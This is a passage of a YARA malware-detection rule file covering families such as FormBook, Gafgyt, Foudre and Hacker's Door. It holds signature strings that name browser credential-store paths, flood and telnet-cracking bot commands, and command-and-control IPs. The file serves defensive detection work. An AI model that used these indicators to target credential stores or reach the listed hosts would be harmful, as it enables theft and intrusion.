\"http://%s/provide?clients=%s&reqs=visit.startload\" fullword wide\n        $x4 = \"\\\\Gubed\\\\Release\\\\Gubed.pdb\" fullword ascii\n        $x5 = \"d2hrpnfyb3wv3k.cloudfront.net\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 1 of them)\n}\n\nrule Floxif_mpsvc_dll\n{\n    meta:\n        description = \"Floxif trojan\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Floxif\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Malware_Floxif_mpsvc_dll\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $op1 = { 04 80 7a 03 01 75 04 8d 42 04 c3 8d 42 04 53 8b }\n        $op2 = { 88 19 74 03 41 eb ea c6 42 03 01 5b c3 8b 4c 24 }\n        $op3 = { ff 03 8d 00 f9 ff ff 88 01 eb a1 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and all of them)\n}\n\nrule Floxif_ccleaner_backdoor\n{\n    meta:\n        description = \"Floxif trojan\"\n        ref = \"http://blog.talosintelligence.com/2017/09/ccleaner-c2-concern.html\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Floxif\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ccleaner_backdoor\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"s:\\\\workspace\\\\ccleaner\\\\branches\\\\v5.33\" fullword ascii wide\n\n    condition:\n        $s1\n}\n\nrule FormBook\n{\n    meta:\n        description = \"FormBook\"\n        classifications = \"Spyware\"\n        threat_names = \"FormBook\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $data1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Outlook\"\n        $data2 = \"AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\"\n        $data3 = \"AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Login Data\"\n\n        // AppData\\Roaming\\<8byte_dir_name>\\<3byte_from_dir_name>logrX.ini in hex form\n        $log1 = {41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C [8] 5C [3] 6C 6F 67 72 67 2E 69 6E 69}\n        $log2 = {41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C [8] 5C [3] 6C 6F 67 72 66 2E 69 6E 69}\n        $log3 = {41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C [8] 5C [3] 6C 6F 67 72 74 2E 69 6E 69}\n        $log4 = {41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C [8] 5C [3] 6C 6F 67 72 69 2E 69 6E 69}\n        $log5 = {41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C [8] 5C [3] 6C 6F 67 72 63 2E 69 6E 69}\n        $log6 = {41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C [8] 5C [3] 6C 6F 67 72 76 2E 69 6E 69}\n        $log7 = {41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C [8] 5C [3] 6C 6F 67 72 6F 2E 69 6E 69}\n        $log8 = {41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C [8] 5C [3] 6C 6F 67 69 6D 2E 6a 70 65 67}\n\n        $dll1 = \"nss3.dll\"\n        $dll2 = \"winsqlite3.dll\"\n        $dll3 = \"vaultcli.dll\"\n        $dll4 = \"gdiplus.dll\"\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and\n        (\n            (\n                all of ($data*)\n                and 3 of ($log*)\n                and 3 of ($dll*)\n            )\n            or 6 of ($log*)\n        )\n}\n\nrule Foudre_Backdoor_1\n{\n    meta:\n        description = \"Foudre backdoor\"\n        ref = \"https://goo.gl/Nbqbt6\"\n        classifications = \"Backdoor\"\n        threat_names = \"Foudre\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Foudre_Backdoor_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"initialization failed: Reinstall the program\" fullword wide\n        $s2 = \"SnailDriver V1\" fullword wide\n        $s3 = \"lp.ini\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 2 of them)\n}\n\nrule Foudre_Backdoor_Dropper_1\n{\n    meta:\n        description = \"Foudre backdoor\"\n        ref = \"https://goo.gl/Nbqbt6\"\n        classifications = \"Backdoor\"\n        threat_names = \"Foudre\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Foudre_Backdoor_Dropper_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"536F594A96C5496CB3949A4DA4775B576E049C57696E646F77735C43757272656E7456657273696F6E5C5C52756E\" fullword wide\n        $x2 = \"2220263024C380B3278695851482EC32\" fullword wide\n        $s1 = \"C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\\\\\Startup\\\\\" fullword wide\n        $s2 = \"C:\\\\Documents and Settings\\\\All Users\\\\\" fullword wide\n        $s3 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\\\\\Shell Folders\" fullword wide\n        $s4 = \"ShellExecuteW\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and (1 of ($x*) or 4 of them))\n}\n\nrule Foudre_Backdoor_Component_1\n{\n    meta:\n        description = \"Foudre backdoor\"\n        ref = \"https://goo.gl/Nbqbt6\"\n        classifications = \"Backdoor\"\n        threat_names = \"Foudre\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Foudre_Backdoor_Component_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = { 50 72 6F 6A 65 63 74 31 2E 64 6C 6C 00 44 31 }\n        $s2 = \"winmgmts:\\\\\\\\localhost\\\\root\\\\SecurityCenter2\" fullword wide\n        $s3 = \"C:\\\\Documents and Settings\\\\All Users\\\\\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and (3 of them) or (2 of them and pe.exports(\"D1\")))\n}\n\nrule Foudre_Backdoor_SFX\n{\n    meta:\n        description = \"Foudre backdoor\"\n        ref = \"https://goo.gl/Nbqbt6\"\n        classifications = \"Backdoor\"\n        threat_names = \"Foudre\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Foudre_Backdoor_SFX\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"main.exe\" fullword ascii\n        $s2 = \"pub.key\" fullword ascii\n        $s3 = \"WinRAR self-extracting archive\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule Furtim_nativeDLL\n{\n    meta:\n        description = \"Furtim malware\"\n        classifications = \"Spyware\"\n        threat_names = \"Furtim\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Furtim_nativeDLL\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"FqkVpTvBwTrhPFjfFF6ZQRK44hHl26\" fullword ascii\n        $op0 = { e0 b3 42 00 c7 84 24 ac }\n        $op1 = { a1 e0 79 44 00 56 ff 90 10 01 00 00 a1 e0 79 44 }\n        $op2 = { bf d0 25 44 00 57 89 4d f0 ff 90 d4 02 00 00 59 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 900KB and $s1 or all of ($op*)\n}\n\nrule Furtim_Parent_1\n{\n    meta:\n        description = \"Furtim malware\"\n        ref = \"https://sentinelone.com/blogs/sfg-furtims-parent/\"\n        classifications = \"Spyware\"\n        threat_names = \"Furtim\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Furtim_Parent_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"dqrChZonUF\" fullword ascii\n        $s1 = \"Egistec\" fullword wide\n        $s2 = \"Copyright (C) 2016\" fullword wide\n        $op1 = { c0 ea 02 88 55 f8 8a d1 80 e2 03 }\n        $op2 = { 5d fe 88 55 f9 8a d0 80 e2 0f c0 }\n        $op3 = { c4 0c 8a d9 c0 eb 02 80 e1 03 88 5d f8 8a d8 c0 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 900KB and ($x1 or (all of ($s*) and all of ($op*)))) or all of them\n}\n\nrule Gafgyt_Botnet_generic : MALW\n{\n    meta:\n        description = \"Gafgyt bot\"\n        classifications = \"Trojan, Bot\"\n        threat_names = \"Gafgyt\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @joanbtl\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Gafgyt_Botnet_generic\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $etcTZ = \"/bin/busybox;echo -e 'gayfgt'\"\n        $s2 = \"/proc/net/route\"\n        $s3 = \"admin\"\n        $s4 = \"root\"\n\n    condition:\n        $etcTZ and $s2 and $s3 and $s4\n}\n\nrule Gafgyt_Botnet_oh : MALW\n{\n    meta:\n        description = \"Gafgyt bot\"\n        classifications = \"Trojan, Bot\"\n        threat_names = \"Gafgyt\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @joanbtl\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Gafgyt_Botnet_oh\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"busyboxterrorist\"\n        $s2 = \"BOGOMIPS\"\n        $s3 = \"124.105.97.%d\"\n        $s4 = \"fucknet\"\n\n    condition:\n        $s1 and $s2 and $s3 and $s4\n}\n\nrule Gafgyt_Botnet_bash : MALW\n{\n    meta:\n        description = \"Gafgyt bot\"\n        classifications = \"Trojan, Bot\"\n        threat_names = \"Gafgyt\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @joanbtl\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Gafgyt_Botnet_bash\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"PONG!\"\n        $s2 = \"GETLOCALIP\"\n        $s3 = \"HTTPFLOOD\"\n        $s4 = \"LUCKYLILDUDE\"\n\n    condition:\n        $s1 and $s2 and $s3 and $s4\n}\n\nrule Gafgyt_Botnet_hoho : MALW\n{\n    meta:\n        description = \"Gafgyt bot\"\n        classifications = \"Trojan, Bot\"\n        threat_names = \"Gafgyt\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @joanbtl\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Gafgyt_Botnet_hoho\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"PING\"\n        $s2 = \"PRIVMSG\"\n        $s3 = \"Remote IRC Bot\"\n        $s4 = \"23.95.43.182\"\n\n    condition:\n        $s1 and $s2 and $s3 and $s4\n}\n\nrule Gafgyt_Botnet_jackmy : MALW\n{\n    meta:\n        description = \"Gafgyt bot\"\n        classifications = \"Trojan, Bot\"\n        threat_names = \"Gafgyt\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @joanbtl\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Gafgyt_Botnet_jackmy\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"PING\"\n        $s2 = \"PONG\"\n        $s3 = \"jackmy\"\n        $s4 = \"203.134.%d.%d\"\n\n    condition:\n        $s1 and $s2 and $s3 and $s4\n}\n\nrule Gafgyt_Botnet_HIHI : MALW\n{\n    meta:\n        description = \"Gafgyt bot\"\n        classifications = \"Trojan, Bot\"\n        threat_names = \"Gafgyt\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @joanbtl\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Gafgyt_Botnet_HIHI\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"PING\"\n        $s2 = \"PONG\"\n        $s3 = \"TELNET LOGIN CRACKED - %s:%s:%s\"\n        $s4 = \"ADVANCEDBOT\"\n        $s5 = \"46.166.185.92\"\n        $s6 = \"LOLNOGTFO\"\n\n    condition:\n        $s1 and $s2 and $s3 and $s4 and $s5 and $s6\n}\n\nrule Gazer_certificate_subject\n{\n    meta:\n        description = \"Gazer backdoor\"\n        ref = \"https://www.welivesecurity.com/2017/08/30/eset-research-cyberespionage-gazer/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Gazer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"ESET\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Gazer_certificate_subject\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        for any i in (0 .. pe.number_of_signatures - 1) : (pe.signatures[i].subject contains \"Solid Loop\" or pe.signatures[i].subject contains \"Ultimate Computer Support\")\n}\n\nrule Gazer_certificate\n{\n    meta:\n        description = \"Gazer backdoor\"\n        ref = \"https://www.welivesecurity.com/2017/08/30/eset-research-cyberespionage-gazer/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Gazer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"ESET\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Gazer_certificate\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $certif1 = { 52 76 a4 53 cd 70 9c 18 da 65 15 7e 5f 1f de 02 }\n        $certif2 = { 12 90 f2 41 d9 b2 80 af 77 fc da 12 c6 b4 96 9c }\n\n    condition:\n        uint16(0) == 0x5a4d and 1 of them and filesize < 2MB\n}\n\nrule Gazer_logfile_name\n{\n    meta:\n        description = \"Gazer backdoor\"\n        ref = \"https://www.welivesecurity.com/2017/08/30/eset-research-cyberespionage-gazer/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Gazer\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"ESET\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Gazer_logfile_name\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"CVRG72B5.tmp.cvr\"\n        $s2 = \"CVRG1A6B.tmp.cvr\"\n        $s3 = \"CVRG38D9.tmp.cvr\"\n\n    condition:\n        uint16(0) == 0x5a4d and 1 of them\n}\n\nrule gholee_v1\n{\n    meta:\n        description = \"Gholee malware\"\n        ref = \"https://www.clearskysec.com/gholee-a-protective-edge-themed-spear-phishing-campaign/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Gholee v1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $a = \"sandbox_avg10_vc9_SP1_2011\"\n        $b = \"gholee\"\n        $c = \"index.php?c=%s&r=%lx&u=1&t=%s\" fullword ascii wide\n\n    condition:\n        all of them\n}\n\nrule gholee_v2\n{\n    meta:\n        description = \"Gholee malware\"\n        ref = \"http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"Gholee v2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@GelosSnake\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"MW_gholee_v2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string0 = \"RichHa\"\n        $string1 = \"         (((((                  H\" wide\n        $string2 = \"1$1,141<1D1L1T1\\\\1d1l1t1\"\n        $string3 = \"<8;$O' \"\n        $string4 = \"@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]\"\n        $string5 = \"jYPQTVTSkllZTTXRTUiHceWda/\"\n        $string6 = \"urn:schemas-microsoft-com:asm.v1\"\n        $string7 = \"8.848H8O8i8s8y8\"\n        $string8 = \"wrapper3\" wide\n        $string9 = \"pwwwwwwww\"\n        $string10 = \"Sunday\"\n        $string11 = \"YYuTVWh\"\n        $string12 = \"DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN\"\n        $string13 = \"ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt\"\n        $string15 = \"wrapper3 Version 1.0\" wide\n        $string16 = \"77A779\"\n        $string17 = \"<C<G<M<R<X<\"\n        $string18 = \"9 9-9N9X9s9\"\n\n    condition:\n        18 of them\n}\n\nrule Grozlex : Stealer\n{\n    meta:\n        description = \"Grozlex info stealer\"\n        classifications = \"Spyware\"\n        threat_names = \"Grozlex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Falcoz\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Grozlex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $signature = {4C 00 6F 00 67 00 73 00 20 00 61 00 74 00 74 00 61 00 63 00 68 00 65 00 64 00 20 00 62 00 79 00 20 00 69 00 43 00 6F 00 7A 00 65 00 6E}\n\n    condition:\n        $signature\n}\n\nrule GuLoader_Shellcode\n{\n    meta:\n        description = \"GuLoader Downloader\"\n        classifications = \"Downloader\"\n        threat_names = \"GuLoader\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s01 = \"C:\\\\ProgramData\\\\qemu-ga\\\\qga.state\"\n        $s02 = \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\"\n        $s03 = \"Startup key\"\n        $s04 = \"WScript.Shell\"\n        $s05 = \"http://myurl/myfile.bin\"\n        $s06 = \"https://drive.google.com/uc?export=download&id=\"\n        $h_evasion  = {68 5B 18 21 7F [0-6] 68 E6 AD 17 3E [0-6] 68 20 D9 1F F2 [0-6] 68 88 31 AA 27 [0-6] 68 12 8F CB DF [0-6] 68 6C C7 9C 2D}\n        $h_shell32  = {E8 ?? ?? ?? ?? 73 68 65 6C 6C 33 32 00}\n        $h_wininet  = {E8 ?? ?? ?? ?? 77 69 6E 69 6E 65 74 2E 64 6C 6C 00}\n        $h_ntdll    = {E8 ?? ?? ?? ?? 6E 74 64 6C 6C 00}\n        $h_regkey   = {E8 ?? ?? ?? ?? 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 57 69 6E 64 6F 77 73 5C 43 75 72 72 65 6E 74 56 65 72 73 69 6F 6E 5C 52 75 6E 4F 6E 63 65 00}\n        $h_msvbvm60 = {E8 ?? ?? ?? ?? (6D 73 76 62 76 6D 36 30 2E 64 6C 6C 00 | 6D 00 73 00 76 00 62 00 76 00 6D 00 36 00 30 00 2E 00 64 00 6C 00 6C 00 00 00)}\n        $h_regasm   = {E8 ?? ?? ?? ?? (52 65 67 41 73 6D 2E 65 78 65 00 | 52 00 65 00 67 00 41 00 73 00 6D 00 2E 00 65 00 78 00 65 00 00 00)}\n\n    condition:\n        vmray_target_class == \"memory_dump\"\n        and 2 of ($s*)\n        and 4 of ($h*)\n}\n\nrule hkdoor_backdoor_dll\n{\n    meta:\n        description = \"Hacker's Door backdoor DLL\"\n        ref = \"https://www.cylance.com/en_us/blog/threat-spotlight-opening-hackers-door.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"Hacker's Door\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cylance Inc.\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"hkdoor_backdoor_dll\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"The version of personal hacker's door server is\" fullword ascii\n        $s2 = \"The connect back interval is %d (minutes)\" fullword ascii\n        $s3 = \"I'mhackeryythac1977\" fullword ascii\n        $s4 = \"Welcome to http://www.yythac.com\" fullword ascii\n        $s5 = \"SeLoadDriverPrivilege\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and (3 of ($s*)) and pe.characteristics & pe.DLL and pe.imports(\"ws2_32.dll\" , \"WSAStartup\") and pe.imports(\"ws2_32.dll\" , \"sendto\")\n}\n\nrule hkdoor_backdoor\n{\n    meta:\n        description = \"Hacker's Door backdoor\"\n        ref = \"https://www.cylance.com/en_us/blog/threat-spotlight-opening-hackers-door.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"Hacker's Door\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cylance Inc.\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"hkdoor_backdoor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://www.yythac.com\" fullword ascii\n        $s2 = \"Example:%s 192.168.1.100 139 -p yyt_hac -t 1\" fullword ascii\n        $s3 = \"password-----------The hacker's door's password\" fullword ascii\n        $s4 = \"It is the client of hacker's door %d.%d public version\" fullword ascii\n        $s5 = \"hkdoordll.dll\" fullword ascii\n        $s6 = \"http://www.yythac.com/images/mm.jpg\" fullword ascii\n        $s7 = \"I'mhackeryythac1977\" fullword ascii\n        $s8 = \"yythac.yeah.net\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and (4 of ($s*))\n}\n\nrule hkdoor_dropper\n{\n    meta:\n        description = \"Hacker's Door backdoor dropper\"\n        ref = \"https://www.cylance.com/en_us/blog/threat-spotlight-opening-hackers-door.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"Hacker's Door\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cylance Inc.\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"hkdoor_dropper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"The version of personal hacker's door server is\" fullword ascii\n        $s2 = \"The connect back interval is %d (minutes)\" fullword ascii\n        $s3 = \"I'mhackeryythac1977\" fullword ascii\n        $s4 = \"Welcome to http://www.yythac.com\" fullword ascii\n        $s5 = \"SeLoadDriverPrivilege\" fullword ascii\n        $s6 = \"\\\\drivers\\\\ntfs.sys\" fullword ascii\n        $s7 = \"kifes\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (4 of ($s*)) and pe.number_of_resources > 0 and for any i in (0 .. pe.number_of_resources - 1) : (pe.resources[i].type_string == \"B\\x00I\\x00N\\x00\" and uint16(pe.resources[i].offset) == 0x5A4D) and pe.imports(\"KERNEL32.dll\" , \"FindResourceW\") and pe.imports(\"KERNEL32.dll\" , \"LoadResource\")\n}\n\nrule hkdoor_driver\n{\n    meta:\n        description = \"Hacker's Door backdoor driver\"\n        classifications = \"Backdoor\"\n        threat_names = \"Hacker's Door\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"hkdoor_driver\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ipfltdrv.sys\" fullword ascii\n        $s2 = \"Patch Success.\" fullword ascii\n        $s3 = \"\\\\DosDevices\\\\kifes\" fullword ascii\n        $s4 = \"\\\\Device\\\\kifes\" fullword ascii\n        $s5 = {75 28 22 36 30 5b 4a 77 7b 58 4d 6c 3f 73 63 5e 38 47 7c 7d 7a 40 3a 41 2a 45 4e 44 79 64 67 6d 65 74 21 39 23 3c 20 49 43 69 4c 3b 31 57 2f 55 3e 26 59 62 61 54 53 5a 2d 25 78 35 5c 76 3d 34 27 6b 5f 72 2c 32 4f 2b 71 66 42 33 37 56 52 60 5d 29 4b 51 2e 6f 50 68 6e 6a 24 48 7e 46 70}\n\n    condition:\n        uint16(0) == 0x5a4d and pe.subsystem == pe.SUBSYSTEM_NATIVE and (4 of ($s*))\n}\n\nrule herpes_strings\n{\n    meta:\n        description = \"Herpes bot\"\n        classifications = \"Bot\"\n        threat_names = \"Herpes\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"herpes_strings\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $queryShort = \"userandpc\"\n        $queryA = \"userandpc=%s&admin=%s&os=%s&id=%s&hwid=%s&ownerid=%s&version=%s\"\n        $queryB = \"userandpc=%s&admin=%s&os=%s&hwid=%s&ownerid=%s&version=%s\"\n\n    condition:\n        2 of them\n}\n\nrule Hsdfihdf : banking malware\n{\n    meta:\n        description = \"Hsdfihdf banking malware\"\n        classifications = \"Spyware\"\n        threat_names = \"Hsdfihdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Adam Ziaja <adam@adamziaja.com> http://adamziaja.com\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Hsdfihdf\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"ANSI_CHARSET\"\n        $s1 = \"][Vee_d_[\"\n        $s2 = \"qfcD:6<\"\n        $s3 = \"%-%/%1%3%5%7%9%;%\"\n        $s4 = \"imhzxsc\\\\WWKD<.)w\"\n        $s5 = \"Vzlarf\\\\]VOZVMskf\"\n        $s6 = \"JKWFAp\\\\Z\"\n        $s7 = \"<aLLwhg\"\n        $s8 = \"bdLeftToRight\"\n        $s9 = 